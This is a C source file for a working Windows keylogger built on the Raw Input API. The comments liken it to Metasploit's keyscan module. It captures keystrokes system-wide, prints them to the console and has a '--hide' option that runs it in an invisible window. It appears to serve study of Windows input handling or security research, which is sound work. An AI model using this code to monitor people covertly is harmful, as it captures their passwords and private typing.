/**
 * Log input keys using raw input devices API
 *
 * This is like Metasploit's meterpreter keyscan module:
 * https://github.com/rapid7/metasploit-payloads/blob/v1.3.74/c/meterpreter/source/extensions/stdapi/server/ui/keyboard.c
 */
#include "common.h"

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    RAWINPUTDEVICE rid;
    UINT cbSize;
    RAWINPUT *pRawInput;
    BOOL fIsFirst;
    UINT uiRemainingFlags;
    TCHAR szBuffer[1024];
    UINT key;

    switch (msg) {
        case WM_CREATE:
            rid.usUsagePage = 0x01;     /* Generic Desktop Controls */
            rid.usUsage = 0x06;         /* Keyboard */
            rid.dwFlags = RIDEV_INPUTSINK; /* 0x100: Received input even when not in foreground */
            rid.hwndTarget = hwnd;

            if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))) {
                print_winerr(_T("RegisterRawInputDevices"));
                return -1;
            }
            break;

        case WM_INPUT:
            /* Retrieve the raw input data */
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &cbSize, sizeof(RAWINPUTHEADER))) {
                print_winerr(_T("GetRawInputData"));
                PostQuitMessage(1);
                return 1;
            }
            pRawInput = HeapAlloc(GetProcessHeap(), 0, cbSize);
            if (!pRawInput) {
                print_winerr(_T("HeapAlloc"));
                PostQuitMessage(1);
                return 1;
            }
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, pRawInput, &cbSize, sizeof(RAWINPUTHEADER)) == -1U) {
                print_winerr(_T("GetRawInputData"));
                PostQuitMessage(1);
                HeapFree(GetProcessHeap(), 0, pRawInput);
                return 1;
            }
            if (pRawInput->header.dwType == RIM_TYPEKEYBOARD) {
                switch (pRawInput->data.keyboard.Message) {
                    case WM_KEYDOWN:
                        _tprintf(_T("Key down: "));
                        break;
                    case WM_KEYUP:
                        _tprintf(_T("Key up  : "));
                        break;
                    case WM_SYSKEYDOWN:
                        _tprintf(_T("SysKey down: "));
                        break;
                    case WM_SYSKEYUP:
                        _tprintf(_T("SysKey up  : "));
                        break;
                    default:
                        _tprintf(_T("Msg %#x: "), pRawInput->data.keyboard.Message);
                }
                _tprintf(_T("Scan=%#x, vkey=%#x"),
                         pRawInput->data.keyboard.MakeCode,
                         pRawInput->data.keyboard.VKey);

                fIsFirst = TRUE;
                /* BRK is normal for key up */
                if (pRawInput->data.keyboard.Message == WM_KEYUP || pRawInput->data.keyboard.Message == WM_SYSKEYUP) {
                    /* ... so negate BRK if it is not set where expected */
                    if (!(pRawInput->data.keyboard.Flags & RI_KEY_BREAK)) {
                        _tprintf(_T("%s!Brk"), fIsFirst ? _T(", flags=") : _T("+"));
                        fIsFirst = FALSE;
                    }
                } else {
                    if (pRawInput->data.keyboard.Flags & RI_KEY_BREAK) {
                        _tprintf(_T("%sBrk"), fIsFirst ? _T(", flags=") : _T("+"));
                        fIsFirst = FALSE;
                    }
                }
                if (pRawInput->data.keyboard.Flags & RI_KEY_E0) {
                    _tprintf(_T("%sE0"), fIsFirst ? _T(", flags=") : _T("+"));
                    fIsFirst = FALSE;
                }
                if (pRawInput->data.keyboard.Flags & RI_KEY_E1) {
                    _tprintf(_T("%sE1"), fIsFirst ? _T(", flags=") : _T("+"));
                    fIsFirst = FALSE;
                }
                uiRemainingFlags = pRawInput->data.keyboard.Flags & ~(RI_KEY_BREAK | RI_KEY_E0 | RI_KEY_E1);
                if (uiRemainingFlags) {
                    _tprintf(_T("%s%#x"), fIsFirst ? _T(", flags=") : _T("+"), uiRemainingFlags);
                    fIsFirst = FALSE;
                }

                key = pRawInput->data.keyboard.MakeCode << 16;
                if (pRawInput->data.keyboard.Flags & RI_KEY_E0)
                    key |= 1 << 24;
                if (GetKeyNameText(key, szBuffer, ARRAYSIZE(szBuffer)) == 0) {
                    _tprintf(_T("\n"));
                    print_winerr(_T("GetKeyNameText"));
                } else {
                    _tprintf(_T(", KeyName=%s"), szBuffer);
                }

                _tprintf(_T("\n"));
            }
            HeapFree(GetProcessHeap(), 0, pRawInput);
            break;

        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int _tmain(int argc, TCHAR **argv)
{
    HANDLE hInstance;
    HWND hwnd;
    WNDCLASSEX wndClassEx;
    ATOM atomWndClass;
    MSG msg;
    BOOL fHideWindow = FALSE;
    int i;

    for (i = 1; i < argc; i++) {
        if (!_tcscmp(argv[i], _T("--hide"))) {
            fHideWindow = TRUE;
        }
    }

    hInstance = GetModuleHandle(NULL);

    ZeroMemory(&wndClassEx, sizeof(WNDCLASSEX));
    wndClassEx.cbSize = sizeof(WNDCLASSEX);
    wndClassEx.lpfnWndProc = WndProc;
    wndClassEx.hInstance = hInstance;
    wndClassEx.lpszClassName = _T("LogKeysRawInputClass");

    atomWndClass = RegisterClassEx(&wndClassEx);
    if (!atomWndClass) {
        print_winerr(_T("RegisterClassEx"));
        return 1;
    }

    if (fHideWindow) {
        /* "hwndParent = HWND_MESSAGE" creates a message-only window */
        hwnd = CreateWindowEx(
            0, /* dwExStyle */
            (LPCTSTR)(UINT_PTR)atomWndClass,
            _T("Log keys"), /* Window name */
            0, /* style */
            0, 0, 0, 0, /* x, y, w, h */
            HWND_MESSAGE, /* hwndParent */
            NULL, /* hMenu */
            hInstance,
            NULL); /* lpParam */
        if (!hwnd) {
            print_winerr(_T("CreateWindowEx(hidden)"));
            return 1;
        }
        _tprintf(_T("Created a hidden window to log keys\n"));
    } else {
        hwnd = CreateWindowEx(
            0, /* dwExStyle */
            (LPCTSTR)(UINT_PTR)atomWndClass,
            _T("Log keys"), /* Window name */
            WS_VISIBLE | WS_OVERLAPPEDWINDOW, /* style */
            CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, /* x, y, w, h */
            NULL, /* hwndParent = HWND_MESSAGE for a message-only window, NULL for an usual window */
            NULL, /* hMenu */
            hInstance,
            NULL); /* lpParam */
        if (!hwnd) {
            print_winerr(_T("CreateWindowEx"));
            return 1;
        }
        ShowWindow(hwnd, SW_NORMAL);
        _tprintf(_T("Created a normal window to log keys\n"));
    }
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}
